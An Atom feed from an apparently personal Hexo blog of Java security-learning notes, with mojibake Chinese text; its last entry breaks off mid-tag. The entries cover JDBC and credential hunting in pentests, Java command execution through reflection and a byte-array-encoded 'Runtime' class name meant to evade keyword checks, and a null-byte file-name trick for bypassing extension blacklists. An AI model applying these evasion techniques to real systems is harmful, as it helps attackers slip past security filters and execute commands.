<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lcdm123</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-10-15T14:56:18.881Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>æµ·é©¬å°‘å¹´</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JDBCåŸºç¡€</title>
    <link href="http://example.com/2021/10/15/JDBC%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2021/10/15/JDBC%E5%9F%BA%E7%A1%80/</id>
    <published>2021-10-15T14:54:04.000Z</published>
    <updated>2021-10-15T14:56:18.881Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JDBC-åŸºç¡€"><a href="#JDBC-åŸºç¡€" class="headerlink" title="JDBC åŸºç¡€"></a>JDBC åŸºç¡€</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>JDBC æ˜¯java æä¾›å¯¹æ•°æ®åº“å°±è¡Œè¿æ¥ï¼Œæ“ä½œå¾—æ ‡å‡† APIï¼ŒJava è‡ªèº«å¹¶ä¸ä¼šå»å®ç°å¯¹æ•°æ®åº“å¾—è¿æ¥æŸ¥è¯¢æ›´æ–°ç­‰æ“ä½œè€Œæ˜¯é€šè¿‡æŠ½è±¡å‡ºæ•°æ®åº“æ“ä½œçš„ API æ¥å£ï¼ˆJDBCï¼‰ã€‚</p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>Javaé€šè¿‡<code>java.sql.DriverManager</code>æ¥ç®¡ç†æ‰€æœ‰æ•°æ®åº“çš„é©±åŠ¨æ³¨å†Œï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦å»ºç«‹æ•°æ®åº“è¿æ¥éœ€è¦å…ˆåœ¨<code>java.sql.DriverManager</code>ä¸­æ³¨å†Œå¯¹åº”çš„é©±åŠ¨ç±»ï¼Œç„¶åè°ƒç”¨<code>getConnection</code>æ–¹æ³•æ‰èƒ½è¿æ¥ä¸Šæ•°æ®åº“ã€‚</p><p>JDBCå®šä¹‰äº†ä¸€ä¸ªå«<code>java.sql.Driver</code>çš„æ¥å£ç±»è´Ÿè´£å®ç°å¯¹æ•°æ®åº“çš„è¿æ¥ï¼Œæ‰€æœ‰çš„æ•°æ®åº“é©±åŠ¨åŒ…éƒ½å¿…é¡»å®ç°è¿™ä¸ªæ¥å£æ‰èƒ½å¤Ÿå®Œæˆæ•°æ®åº“çš„è¿æ¥æ“ä½œã€‚<code>java.sql.DriverManager.getConnection(xx)</code>å…¶å®å°±æ˜¯é—´æ¥çš„è°ƒç”¨äº†<code>java.sql.Driver</code>ç±»çš„<code>connect</code>æ–¹æ³•å®ç°æ•°æ®åº“è¿æ¥çš„ã€‚æ•°æ®åº“è¿æ¥æˆåŠŸåä¼šè¿”å›ä¸€ä¸ªå«åš<code>java.sql.Connection</code>çš„æ•°æ®åº“è¿æ¥å¯¹è±¡ï¼Œä¸€åˆ‡å¯¹æ•°æ®åº“çš„æŸ¥è¯¢æ“ä½œéƒ½å°†ä¾èµ–äºè¿™ä¸ª<code>Connection</code>å¯¹è±¡ã€‚</p><p>JDBCè¿æ¥æ•°æ®åº“çš„ä¸€èˆ¬æ­¥éª¤:</p><ol><li>æ³¨å†Œé©±åŠ¨ <code>Class.forName(&quot;æ•°æ®åº“é©±åŠ¨çš„ç±»å&quot;)</code></li><li>è·å–è¿æ¥ <code>DriverManager.getConnection()</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">String CLASS_NAME = <span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>;<br>String URL = <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/mysql&quot;</span><br>String USERNAME = <span class="hljs-string">&quot;root&quot;</span>;<br>String PASSWORD = <span class="hljs-string">&quot;root&quot;</span>;<br><br>Class.forName(CLASS_NAME);<span class="hljs-comment">// æ³¨å†ŒJDBCé©±åŠ¨ç±»</span><br>Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);<br></code></pre></td></tr></table></figure><p><strong>æ•°æ®åº“é…ç½®ä¿¡æ¯</strong></p><p>ä¼ ç»Ÿçš„ Web åº”ç”¨æ•°æ®åº“é…ç½®ä¿¡æ¯ä¸€èˆ¬éƒ½æ˜¯å­˜åœ¨ <code>WEB-INF</code> ç›®å½•ä¸‹çš„ <code>*.properties</code> <code>*.yml</code> <code>*.xml</code>ä¸­çš„ï¼Œå¦‚æœæ˜¯ <code>Spring Boot</code> é¡¹ç›®çš„è¯ä¸€èˆ¬éƒ½å­˜å‚¨åœ¨ <code>src/main/resources/</code> ç›®å½•ä¸‹ã€‚å¸¸è§çš„æ•°æ®åº“é…ç½®ä¿¡æ¯çš„è·¯å¾„ï¼š<code>WEB-INF/applicationContext.xml</code> <code>WEB-INF/hibernate.cfg.xml</code> <code>WEB-INF/jdbc/jdbc.properties</code> </p><p><strong>ä¸ºä»€ä¹ˆå¼€å§‹çš„æ—¶å€™éœ€è¦ <code>Class.forName()</code> ?</strong></p><p>è¿™ä¸€æ­¥åˆ©ç”¨äº† java åå°„ + ç±»åŠ è½½æœºåˆ¶å¾€ <code>DriverManager</code> ä¸­æ³¨å†Œäº†é©±åŠ¨åŒ…ï¼Œå®ƒå®é™…ä¸Šä¼šè§¦å‘ç±»åŠ è½½ï¼Œ<code>com.mysql.jdbc.Driver</code> ç±»å°†ä¼šè¢«åˆå§‹åŒ–ï¼Œ<code>staticé™æ€è¯­å¥å—</code> ä¸­çš„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚ä½†æ˜¯æœ‰äº›æ—¶å€™æ²¡æœ‰ <code>Class.forName()</code> ç¨‹åºä¹Ÿå¯ä»¥æ­£å¸¸è¿è¡Œï¼Œè¿™æ˜¯å› ä¸º Java SPIæœºåˆ¶ã€‚å› ä¸º<code>DriverManager</code>åœ¨åˆå§‹åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨<code>java.util.ServiceLoader</code>ç±»æä¾›çš„SPIæœºåˆ¶ï¼ŒJavaä¼šè‡ªåŠ¨æ‰«æjaråŒ…ä¸­çš„<code>META-INF/services</code>ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¹¶ä¸”è¿˜ä¼šè‡ªåŠ¨çš„<code>Class.forName(æ–‡ä»¶ä¸­å®šä¹‰çš„ç±»)</code>ï¼Œè¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆä¸éœ€è¦<code>Class.forName</code>ä¹Ÿèƒ½å¤ŸæˆåŠŸè¿æ¥æ•°æ®åº“çš„åŸå› äº†ã€‚</p><p><strong>Java SPI</strong></p><p>SPI(Service Provider Interface)ï¼Œæ˜¯JDKå†…ç½®çš„ä¸€ç§æœåŠ¡æä¾›å‘ç°æœºåˆ¶ã€‚å®ƒå°±æ˜¯ä¸€ç§åŠ¨æ€æ›¿æ¢å‘ç°æœºåˆ¶ã€‚ä¾‹å¦‚ï¼šæœ‰ä¸ªæ¥å£æƒ³åœ¨è¿è¡Œæ—¶æ‰å‘ç°å…·ä½“çš„å®ç°ç±»ï¼Œé‚£ä¹ˆä½ åªéœ€è¦åœ¨ç¨‹åºè¿è¡Œå‰æ·»åŠ ä¸€ä¸ªå®ç°å³å¯ï¼Œå¹¶æŠŠæ–°åŠ çš„å®ç°æè¿°ç»™JDKå³å¯ã€‚æ­¤å¤–ï¼Œåœ¨ç¨‹åºçš„è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œä¹Ÿå¯ä»¥éšæ—¶å¯¹è¯¥æè¿°è¿›è¡Œä¿®æ”¹ï¼Œå®Œæˆå…·ä½“å®ç°çš„æ›¿æ¢ã€‚</p><p>Javaæä¾›äº†å¾ˆå¤šæœåŠ¡æä¾›è€…æ¥å£ï¼ˆService Provider Interfaceï¼ŒSPIï¼‰ï¼Œå…è®¸ç¬¬ä¸‰æ–¹ä¸ºè¿™äº›æ¥å£æä¾›å®ç°ã€‚å¸¸è§çš„SPIæœ‰JDBCã€JCEã€JNDIã€JAXPå’ŒJBIç­‰ã€‚</p><h2 id="æ•°æ®åº“è¿æ¥æ€è€ƒ"><a href="#æ•°æ®åº“è¿æ¥æ€è€ƒ" class="headerlink" title="æ•°æ®åº“è¿æ¥æ€è€ƒ"></a>æ•°æ®åº“è¿æ¥æ€è€ƒ</h2><ol><li>SPIæœºåˆ¶æ˜¯å¦æœ‰å®‰å…¨æ€§é—®é¢˜ï¼Ÿ</li><li>Javaåå°„æœ‰é‚£äº›å®‰å…¨é—®é¢˜ï¼Ÿ</li><li>Javaç±»åŠ è½½æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Ÿ</li><li>æ•°æ®åº“è¿æ¥æ—¶å¯†ç å®‰å…¨é—®é¢˜ï¼Ÿ</li><li>ä½¿ç”¨JDBCå¦‚ä½•å†™ä¸€ä¸ªé€šç”¨çš„æ•°æ®åº“å¯†ç çˆ†ç ´æ¨¡å—ï¼Ÿ</li></ol><h2 id="DataSource"><a href="#DataSource" class="headerlink" title="DataSource"></a>DataSource</h2><p>åœ¨çœŸå®çš„ Java é¡¹ç›®ä¸­é€šå¸¸ä¸ä¼šä½¿ç”¨åŸç”Ÿçš„ <code>JDBC</code> çš„ <code>DiverManager</code> å»è¿æ¥æ•°æ®åº“ï¼Œè€Œæ˜¯ä½¿ç”¨æ•°æ®æº(<code>javax.sql.DataSource</code>) æ¥ä»£æ›¿ <code>DriverManager</code> ç®¡ç†æ•°æ®åº“çš„è¿æ¥ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ WEB æœåŠ¡åœ¨å¯åŠ¨æ—¶å°±ä¼šé¢„å…ˆå®šä¹‰å¥½æ•°æ®æºï¼Œè¿™æ ·å°±ä¸éœ€è¦ç¼–å†™ä»»ä½•æ•°æ®åº“ç›¸å…³çš„è¿æ¥ä»£ç äº†ï¼Œç›´æ¥å¼•ç”¨ <code>DataSource</code> å¯¹è±¡å³å¯è·å–æ•°æ®åº“çš„è¿æ¥ã€‚å¸¸è§çš„æ•°æ®æºæœ‰ï¼š<code>DBCP</code> <code>C3P0</code> <code>Druid</code> <code>Mybatis DataSource</code> ä»–ä»¬éƒ½å®ç°äº <code>javax.sql.DataSourcec</code> æ¥å£ã€‚</p><p>åœ¨æ¸—é€æµ‹è¯•ä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥æ‰¾ Spring æ•°æ®åº“é…ç½®ä¿¡æ¯çš„æ‰¾åˆ°æ•°æ®åº“è´¦æˆ·å¯†ç ï¼Œä½†æ˜¯å¾ˆå¤šæ—¶å€™æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°éå¸¸å¤šçš„é…ç½®é¡¹ç”šè‡³æ˜¯åŠ å¯†çš„é…ç½®ä¿¡æ¯ã€‚è¿™æ ·æˆ‘ä»¬éš¾ä»¥ç¡®å®šçœŸå®çš„æ•°æ®åº“é…ç½®ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨<code>webshell</code> ä¸­ä½¿ç”¨æ³¨å…¥æ•°æ®æºçš„æ–¹å¼æ¥è·å–æ•°æ®åº“è¿æ¥å¯¹è±¡ï¼Œç”šè‡³æ˜¯è¯»å–æ•°æ®åº“å¯†ç ã€‚</p><p>å‚è€ƒæ–‡ç« </p><p><a href="https://zhishihezi.net/endpoint/richtext/6d9a22ba0a35a008c8a26de9be0af285?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d003f2aa7f127f0eebacd7781dfcc96fffc113c2aa6524a270d806d0b5cb74fcd848dc0e71a1806ba8aa6795310d7f5156f8679b530f66f98d69bcca054b7161d0311712560fdab58f84fb9f475c33e2307e1d1bf7f16cb4b78ffb1de583bcb8bdc68ff1a4b3c274eeb49ebe71ce5cc010855f8493aa598d6535c728e2b2e0c78623ece5513ef7d2037e1aa34c9180a9217120669f13f79be67e876422272b76e9a39062c8f6f4f45182f7f0d2dfab296e83843031274d8b7d87c8e39e3921eb4b9#2">https://zhishihezi.net/endpoint/richtext/6d9a22ba0a35a008c8a26de9be0af285?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d003f2aa7f127f0eebacd7781dfcc96fffc113c2aa6524a270d806d0b5cb74fcd848dc0e71a1806ba8aa6795310d7f5156f8679b530f66f98d69bcca054b7161d0311712560fdab58f84fb9f475c33e2307e1d1bf7f16cb4b78ffb1de583bcb8bdc68ff1a4b3c274eeb49ebe71ce5cc010855f8493aa598d6535c728e2b2e0c78623ece5513ef7d2037e1aa34c9180a9217120669f13f79be67e876422272b76e9a39062c8f6f4f45182f7f0d2dfab296e83843031274d8b7d87c8e39e3921eb4b9#2</a></p><p><a href="https://www.jianshu.com/p/e4262536000d">https://www.jianshu.com/p/e4262536000d</a></p><p><a href="https://blog.csdn.net/qq_27292113/article/details/100324127">https://blog.csdn.net/qq_27292113/article/details/100324127</a></p><p><a href="https://zhishihezi.net/endpoint/richtext/7cf5943a331e912a8ced8264b65ba4a4?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00fc7ce3fe3cc9fffd10a895293a0425000f798ef1f4285bc4615898486a533462dd5cc0aa1f49f370afa6cd415c847e879b80964a7cb47f9a65a3a3eec81b131c19d0650b1955cf6e77d0293a369bc09e0299b0f9c58f7226ee6c6df1f94abf9ad020bcff67e838b4fe63a4aaadcf14a330023e181ca50a45e91822ebb11299dff426c4e8dcaa968b62df740cfce6b4480a215dc739f8028c6c29d6d1079bf4dd3e70addaaf843b9fa061943758d25bb1a9ef2983de1ecbd6ca659e367482affd#1">https://zhishihezi.net/endpoint/richtext/7cf5943a331e912a8ced8264b65ba4a4?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00fc7ce3fe3cc9fffd10a895293a0425000f798ef1f4285bc4615898486a533462dd5cc0aa1f49f370afa6cd415c847e879b80964a7cb47f9a65a3a3eec81b131c19d0650b1955cf6e77d0293a369bc09e0299b0f9c58f7226ee6c6df1f94abf9ad020bcff67e838b4fe63a4aaadcf14a330023e181ca50a45e91822ebb11299dff426c4e8dcaa968b62df740cfce6b4480a215dc739f8028c6c29d6d1079bf4dd3e70addaaf843b9fa061943758d25bb1a9ef2983de1ecbd6ca659e367482affd#1</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JDBC-åŸºç¡€&quot;&gt;&lt;a href=&quot;#JDBC-åŸºç¡€&quot; class=&quot;headerlink&quot; title=&quot;JDBC åŸºç¡€&quot;&gt;&lt;/a&gt;JDBC åŸºç¡€&lt;/h1&gt;&lt;h2 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€</summary>
      
    
    
    
    <category term="ç¼–ç¨‹è¯­è¨€" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>javaå‘½ä»¤æ‰§è¡Œ</title>
    <link href="http://example.com/2021/10/15/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2021/10/15/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2021-10-15T14:53:54.000Z</published>
    <updated>2021-10-15T14:55:46.551Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-å‘½ä»¤æ‰§è¡Œ"><a href="#Java-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="Java å‘½ä»¤æ‰§è¡Œ"></a>Java å‘½ä»¤æ‰§è¡Œ</h1><h2 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å­—ç¬¦ä¸²è½¬å­—èŠ‚æ•°ç»„</span><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestRun</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">        String rt = new String(new byte[]&#123;106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101&#125;);</span><br><span class="hljs-comment">*/</span><br>        String rt = <span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>;<br>        <span class="hljs-keyword">byte</span>[] bytes = rt.getBytes();<br>        System.out.println(Arrays.toString(bytes));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211015140423647.png" alt="image-20211015140423647"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å­—èŠ‚æ•°ç»„è½¬å­—ç¬¦ä¸²</span><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestRun</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        String str = <span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">85</span>, <span class="hljs-number">78</span>, <span class="hljs-number">73</span>, <span class="hljs-number">88</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>&#125;);<br>        System.out.println(str);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="D:\markdown\image-20211015140627401.png" alt="image-20211015140627401"></p><h2 id="Runtime-å‘½ä»¤æ‰§è¡Œ"><a href="#Runtime-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="Runtime å‘½ä»¤æ‰§è¡Œ"></a>Runtime å‘½ä»¤æ‰§è¡Œ</h2><p>é¿å…ç¨‹åºå‡ºç° <code>Runtime</code> å…³é”®å­—ï¼Œå¯ä»¥ä½¿ç”¨å­—èŠ‚æ•°ç»„æ¥ç»•è¿‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestRun</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;<br>        String runtime  = <span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;);<br>        Class rt = Class.forName(runtime);<br>        Constructor cons = rt.getDeclaredConstructor();<br>        cons.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object run = cons.newInstance();<br>        Method exec = rt.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        exec.invoke(run,<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="ProcessBuilderå‘½ä»¤æ‰§è¡Œ"><a href="#ProcessBuilderå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ProcessBuilderå‘½ä»¤æ‰§è¡Œ"></a><img src="https://gitee.com/lcdm123/image/raw/master/image-20211015143252943.png" alt="image-20211015143252943">ProcessBuilderå‘½ä»¤æ‰§è¡Œ</h2><p>ä¹‹å‰è®°å½•è¿‡â€¦â€¦</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¯¹ç±»ç†Ÿç»ƒä½¿ç”¨åï¼Œåé¢å°±èƒ½ä½¿ç”¨å„ç§å˜å½¢æ¥ç»•è¿‡æ£€æŸ¥æ‰§è¡Œå‘½ä»¤äº†</p><p>ç®€å•è®°å½•ä¸€ä¸‹ï¼Œä¸‡ä¸€åé¢æœ‰ç”¨å‘¢ğŸ¤ª</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-å‘½ä»¤æ‰§è¡Œ&quot;&gt;&lt;a href=&quot;#Java-å‘½ä»¤æ‰§è¡Œ&quot; class=&quot;headerlink&quot; title=&quot;Java å‘½ä»¤æ‰§è¡Œ&quot;&gt;&lt;/a&gt;Java å‘½ä»¤æ‰§è¡Œ&lt;/h1&gt;&lt;h2 id=&quot;å‡†å¤‡&quot;&gt;&lt;a href=&quot;#å‡†å¤‡&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="ç¼–ç¨‹è¯­è¨€" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>javaç©ºå­—èŠ‚æ¼æ´</title>
    <link href="http://example.com/2021/10/15/java%E7%A9%BA%E5%AD%97%E8%8A%82%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/10/15/java%E7%A9%BA%E5%AD%97%E8%8A%82%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-10-15T14:53:31.000Z</published>
    <updated>2021-10-15T14:55:16.187Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-ç©ºå­—èŠ‚æˆªæ–­æ¼æ´"><a href="#Java-ç©ºå­—èŠ‚æˆªæ–­æ¼æ´" class="headerlink" title="Java ç©ºå­—èŠ‚æˆªæ–­æ¼æ´"></a>Java ç©ºå­—èŠ‚æˆªæ–­æ¼æ´</h1><p>Javaç©ºå­—èŠ‚æ¼æ´å½±å“çš„æ˜¯ JDK ç‰ˆæœ¬å°äº 7u40</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">åˆ›å»ºæ–‡ä»¶æ—¶ä½¿ç”¨<br>E:\\test.txt\u0000.jpg<br>æœ€åçš„æ–‡ä»¶ä¼šå˜æˆ E:\\test.txt<br></code></pre></td></tr></table></figure><p>æ¼æ´çš„åˆ©ç”¨åœºæ™¯æ›´å¤šåœ¨äºé»‘åå•åç¼€åé™åˆ¶</p><blockquote><p>æ²¡æœ‰å»é…ç¯å¢ƒï¼Œæ‰€ä»¥å°±è¿™æ ·ç›´æ¥è®°å½•å§</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-ç©ºå­—èŠ‚æˆªæ–­æ¼æ´&quot;&gt;&lt;a href=&quot;#Java-ç©ºå­—èŠ‚æˆªæ–­æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;Java ç©ºå­—èŠ‚æˆªæ–­æ¼æ´&quot;&gt;&lt;/a&gt;Java ç©ºå­—èŠ‚æˆªæ–­æ¼æ´&lt;/h1&gt;&lt;p&gt;Javaç©ºå­—èŠ‚æ¼æ´å½±å“çš„æ˜¯ JDK ç‰ˆæœ¬å°äº 7u40&lt;/p</summary>
      
    
    
    
    <category term="ç¼–ç¨‹è¯­è¨€" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Web" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Web/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>javaæ–‡ä»¶æ“ä½œ</title>
    <link href="http://example.com/2021/10/13/java%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <id>http://example.com/2021/10/13/java%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</id>
    <published>2021-10-13T11:06:37.000Z</published>
    <updated>2021-10-13T11:07:13.007Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-æ–‡ä»¶ç³»ç»Ÿ"><a href="#Java-æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="Java æ–‡ä»¶ç³»ç»Ÿ"></a>Java æ–‡ä»¶ç³»ç»Ÿ</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Java æ˜¯ä¸€ä¸ªè·¨å¹³å°çš„è¯­è¨€ï¼Œä¸åŒçš„æ“ä½œç³»ç»Ÿå…·æœ‰å®Œå…¨ä¸ä¸€æ ·çš„æ–‡ä»¶ç³»ç»Ÿå’Œç‰¹æ€§ã€‚JDKä¼šæ ¹æ®ä¸åŒçš„æ“ä½œç³»ç»Ÿç¼–è¯‘æˆä¸åŒçš„ç‰ˆæœ¬ã€‚Java å¯¹æ–‡ä»¶çš„ä»»ä½•æ“ä½œéƒ½æ˜¯é€šè¿‡ JNI è°ƒç”¨ C è¯­è¨€å‡½æ•°å®ç°çš„ã€‚Java ä¸ºäº†èƒ½å¤Ÿå®ç°è·¨æ“ä½œç³»ç»Ÿå¯¹æ–‡ä»¶å°±è¡Œæ“ä½œæŠ½è±¡äº†ä¸€ä¸ª <code>FileSystem</code> çš„å¯¹è±¡ï¼Œä¸åŒçš„æ“ä½œç³»ç»Ÿåªéœ€è¦å®ç°æŠ½è±¡å‡ºæ¥çš„æ–‡ä»¶æ“ä½œæ–¹æ³•å°±å¯ä»¥å®ç°è·¨å±å¹³å°çš„æ–‡ä»¶æ“ä½œã€‚</p><h2 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h2><p>åœ¨ Java SEä¸­å†…ç½®äº†ä¸¤ç±»æ–‡ä»¶ç³»ç»Ÿï¼š<code>java.io</code> å’Œ <code>java.nio</code>ï¼Œ <code>java.nio</code>çš„å®ç°æ˜¯<code>sun.nio</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012205656607.png" 